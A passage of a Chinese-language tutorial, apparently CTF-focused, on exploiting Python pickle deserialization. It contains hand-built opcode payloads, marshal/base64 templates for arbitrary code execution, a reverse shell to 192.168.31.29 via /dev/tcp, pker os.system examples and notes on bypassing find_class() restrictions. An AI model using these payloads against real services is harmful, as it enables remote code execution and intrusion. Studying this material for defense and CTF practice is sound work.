&lt;/code>&lt;/pre>&lt;/div>&lt;p>现在得到了序列化的字符串，我们希望它被反序列化时执行，但是直接将他放入&lt;code>__reduce__&lt;/code>返回部分似乎并不可以，&lt;code>__reduce__&lt;/code>是调用callable来执行参数之类的，而我们构造好的本身就是callable，希望它执行而不是作为另一个callable的参数；这时就需要直接从PVM操作码的层级进行构造了。&lt;/p>
&lt;p>————其实我觉得更通俗的理解是这样可以不把要执行的代码限制在&lt;code>return (os.system,(a,))&lt;/code>这样式的框架中，而是可以自由的执行代码，或者说就是另一种形式的pker&lt;/p>
&lt;p>我们需要执行的其实是（利用到python oop的特性，通过&lt;code>types.FunctionTyle(func_code,globals(),’’)()&lt;/code>来动态地创建匿名函数，参见：&lt;a href="https://docs.python.org/zh-cn/3/library/types.html#module-types">官方文档&lt;/a>）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">types&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FunctionType&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_enc&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">))()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者更可读一些&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">code_str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_enc&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_str&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">func&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">types&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FunctionType&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">func&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>接下来就是手动构造opcode的时候了，回想之前返回一个简单的shell时的opcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cos&lt;/span>
&lt;span style="color:#111">system&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>开头的c后面跟的是引入的模块，换行之后是函数，再换行之后是执行的语句；根据这个结构把marshal和b64加进去&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cmarshal&lt;/span>
&lt;span style="color:#111">loads&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbase64&lt;/span>
&lt;span style="color:#111">b64decode&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;YwAAAAAB........&amp;#39;&lt;/span>
&lt;span style="color:#111">tRtR&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>而globals()可以在&lt;code>__builtin__&lt;/code>模块中引入&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{}{}&lt;/span>
&lt;span style="color:#111">c__builtin__&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>把上面的缝合起来得到最终的payload，注意添加&lt;code>(rR.&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">ctypes&lt;/span>
&lt;span style="color:#111">FunctionType&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmarshal&lt;/span>
&lt;span style="color:#111">loads&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbase64&lt;/span>
&lt;span style="color:#111">b64decode&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;YwAAAAAB........&amp;#39;&lt;/span>
&lt;span style="color:#111">tRtRc__builtin__&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>构造这个人看着费劲的payload的模板~（来源参见：&lt;a href="https://checkoway.net/musings/pickle/">Arbitrary code execution with Python pickles&lt;/a>）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span> &lt;span style="color:#75715e"># Your code here&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;ctypes
&lt;/span>&lt;span style="color:#d88200">FunctionType
&lt;/span>&lt;span style="color:#d88200">(cmarshal
&lt;/span>&lt;span style="color:#d88200">loads
&lt;/span>&lt;span style="color:#d88200">(cbase64
&lt;/span>&lt;span style="color:#d88200">b64decode
&lt;/span>&lt;span style="color:#d88200">(S&amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;
&lt;/span>&lt;span style="color:#d88200">tRtRc__builtin__
&lt;/span>&lt;span style="color:#d88200">globals
&lt;/span>&lt;span style="color:#d88200">(tRS&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200">tR(tR.&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>用pickle执行一下那串payload看看效果&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809094819276.png" alt="image-20210809094819276">&lt;/p>
&lt;p>成功返回了斐波那契数列的结果和一个shell&lt;/p>
&lt;p>原理都是一样的，也可以用Marshal+b64的方式反弹shell（用模板生成opcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># print &amp;#39;hold on...&amp;#39;&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;ctypes
&lt;/span>&lt;span style="color:#d88200">FunctionType
&lt;/span>&lt;span style="color:#d88200">(cmarshal
&lt;/span>&lt;span style="color:#d88200">loads
&lt;/span>&lt;span style="color:#d88200">(cbase64
&lt;/span>&lt;span style="color:#d88200">b64decode
&lt;/span>&lt;span style="color:#d88200">(S&amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;
&lt;/span>&lt;span style="color:#d88200">tRtRc__builtin__
&lt;/span>&lt;span style="color:#d88200">globals
&lt;/span>&lt;span style="color:#d88200">(tRS&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200">tR(tR.&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810015119794.png" alt="image-20210810015119794">&lt;/p>
&lt;p>————或者下面这个模板也可以达到上面的效果（执行代码 而不包含类和函数）（来源：&lt;a href="https://gist.github.com/freddyb/3360650#file-pickle_compiler-py">pickle_compiler.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cPickle&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">ImportError&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">sys&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">argv&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">picklecompiler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sourcefile&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">sourcecode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sourcefile&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;c__builtin__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">eval&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(c__builtin__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">compile&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">S&amp;#39;&amp;lt;payload&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&amp;#39;exec&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">tRtR.&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#111">sourcecode&lt;/span> &lt;span style="color:#111">)[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">],)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">usage&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;usage: python &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200"> filename&amp;#39;&amp;#39;&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">picklecompiler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">usage&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="工具二连---通过upkeruhttpsgithubcomeddieivan01pker构造opcode">工具二连 - 通过&lt;a href="https://github.com/eddieivan01/pker">&lt;u>pker&lt;/u>&lt;/a>构造opcode&lt;/h3>
&lt;p>原理参见：&lt;a href="https://xz.aliyun.com/t/7012#toc-5">通过AST来构造Pickle opcode - 自动化构造&lt;/a>，利用了抽象语法树&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809232152276.png" alt="image-20210809232152276">&lt;/p>
&lt;p>pker会用到&lt;code>GLOBAL&lt;/code>, &lt;code>INST&lt;/code>, &lt;code>OBJ&lt;/code>这三种特殊函数和一些必要的转换方式；下面是pker的简单小栗子（更多使用说明详见上面的链接）&lt;/p>
&lt;ul>
&lt;li>
&lt;p>全局变量覆盖&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 覆盖直接由执行文件引入secret模块中的name和category模块&lt;/span>
&lt;span style="color:#111">ecret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;secret&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 覆盖引入模块的变量&lt;/span>
&lt;span style="color:#111">game&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;game&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">curr_ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;123&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>函数执行&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 通过b&amp;#39;R&amp;#39;调用 __reducce__方法&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>
&lt;span style="color:#111">system&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 通过b&amp;#39;i&amp;#39;调用&lt;/span>
&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 通过b&amp;#39;c&amp;#39;和b&amp;#39;o&amp;#39;调用&lt;/span>
&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 多参数调用函数&lt;/span>
&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[module]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;[callable]&amp;#39;&lt;/span>&lt;span style="color:#111">[,&lt;/span> &lt;span style="color:#111">param0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">param1&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[module]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;[callable]&amp;#39;&lt;/span>&lt;span style="color:#111">)[,&lt;/span> &lt;span style="color:#111">param0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">param1&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>实例化对象（特殊的函数执行）&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">animal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;span style="color:#111">animal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>先对题目有大概思路，然后辅以工具~好耶&lt;/p>
&lt;h3 id="工具二连---uanapickleuhttpsgithubcomsensepostanapickle">工具二连 - &lt;a href="https://github.com/sensepost/anapickle">&lt;u>anapickle&lt;/u>&lt;/a>&lt;/h3>
&lt;p>其实一个年龄很大的脚本了，支持python2.3。。。。但是包含了很多payload，可以灵活运用~&lt;/p>
&lt;h2 id="bypass">bypass!!!&lt;/h2>
&lt;h3 id="对类型的检查">对类型的检查&lt;/h3>
&lt;p>可以在已经构造好的opcode后面去掉&lt;code>.&lt;/code>再续上相应的对象的opcode，作为栈顶的值供检查&lt;/p>
&lt;h3 id="限制bc对模块的引入---find_class的重写">限制&lt;code>b'c'&lt;/code>对模块的引入 - &lt;code>find_class()&lt;/code>的重写&lt;/h3>
&lt;p>修改&lt;code>find_class()&lt;/code>会引入函数&amp;amp;模块的白名单，一定程度上解决pickle的安全性问题；以下两种情况会调用&lt;code>find_class()&lt;/code>的检查：&lt;/p>
&lt;ul>
&lt;li>opcode角度：出现&lt;code>c&lt;/code>, &lt;code>i&lt;/code>, &lt;code>b'\x93'&lt;/code>会调用&lt;/li>
&lt;li>python角度：find_class()只会在解析opcode时调用一次，只要绕过opcode的执行过程，之后再产生的函数在黑名单中也不会拦截（比如通过&lt;code>__import__&lt;/code>来绕过）&lt;/li>
&lt;/ul>
&lt;h3 id="--仅可以引入__main__开头的模块">&amp;ndash;&amp;raquo;仅可以引入&lt;code>__main__&lt;/code>开头的模块&lt;/h3>
